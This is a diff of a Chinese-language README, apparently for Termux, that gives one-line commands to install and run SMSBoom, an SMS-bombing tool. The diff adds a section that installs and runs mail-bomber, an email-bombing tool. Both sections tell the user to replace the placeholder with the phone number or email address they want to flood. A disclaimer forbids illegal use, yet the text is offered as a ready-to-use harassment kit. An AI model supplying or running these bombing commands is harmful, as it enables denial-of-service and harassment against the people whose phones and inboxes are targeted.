@@ -10,15 +10,26 @@
 - 
   ## 一键代码使用
   ### 短信轰炸
-  `pkg install git && pkg install python && pkg install openssl && git clone https://github.com/AdminWhaleFall/SMSBoom.git/ && cd SMSBoom && pip install -r requirements.txt && python smsboom.py`
+  `pkg install git && pkg install python && pkg install openssl &&  git clone https://github.com/AdminWhaleFall/SMSBoom.git/ && cd SMSBoom && pip install -r requirements.txt && python smsboom.py`
 - 直接粘贴代码进入即可，后续可以直接使用下列指令
 - 
   `cd SMSBoom;python smsboom.py run -t 64 -p 184****9269 -f 60 `
   将手机号替换为你需要轰炸的手机号
 
  ### 邮箱轰炸
+ `pkg install git && pkg install php && git clone https://github.com/cat-bucket/mail-bomber && cd mail-bomber && `
+ 
+
+ 
+更新接口（可选）
+`php index.php update-nodes`
+
+后续使用
+`cd mail-bomber;php index.php start-bombing 邮箱`
+将要轰炸的邮箱替换
+
 
 ## 免责声明
-本库为对SMSBOOM的简单调用提供，仅供参考，禁止用于商业及非法用途。使用smsboom造成的事故与损失，与作者无关
+本库为对各种程序的简单调用提供，仅供参考，禁止用于商业及非法用途。使用一键指令造成的事故与损失，与作者无关
 
 
